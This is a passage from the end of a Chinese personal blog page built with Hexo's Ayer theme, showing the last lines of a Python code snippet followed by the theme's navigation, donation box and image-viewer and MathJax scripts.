class="keyword">break</span></span><br><span class="line">        sys.stdout.write(<span class="string">"\r\n"</span>)</span><br><span class="line">        sys.stdout.flush()</span><br></pre></td></tr></table></figure>








      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
  </article>
  

  
  <nav class="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
  </nav>
  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul class="list-inline">
      <li>
        &copy;
        2020
        0Rld
      </li>
      <li>
        
          Powered by
        
        
        <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
        
      </li>
    </ul>
    <ul class="list-inline">
      <li>
        
        
        <span>
  <i>PV:<span id="busuanzi_value_page_pv"></span></i>
  <i>UV:<span id="busuanzi_value_site_uv"></span></i>
</span>
        
      </li>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src=''></script>
        
      </li>
    </ul>
  </div>
</footer>
    <div class="to_top">
        <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>
      </div>
    </main>
      <aside class="sidebar">
        <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/1.jpg" alt="0Rld"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/2020/about">About</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="Search">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
      </aside>
      <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>Buy me a cup of coffee~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
      
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/lazyload.min.js"></script>


<script src="/js/busuanzi-2.3.pure.min.js"></script>


<script src="/js/share.js"></script>



<script src="/fancybox/jquery.fancybox.min.js"></script>




<script>
  try {
    var typed = new Typed("#subtitle", {
    strings: ['四季更替，梦境更迭','生活,旅行,思考,代码,博客','努力一定会有所获！'],
    startDelay: 0,
    typeSpeed: 200,
    loop: true,
    backSpeed: 100,
    showCursor: true
    });
  } catch (err) {
  }
  
</script>




<script>
  var ayerConfig = {
    mathjax: true
  }
</script>


<script src="/js/ayer.js"></script>


<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script>



<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>


<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
  </div>
</body>

</html>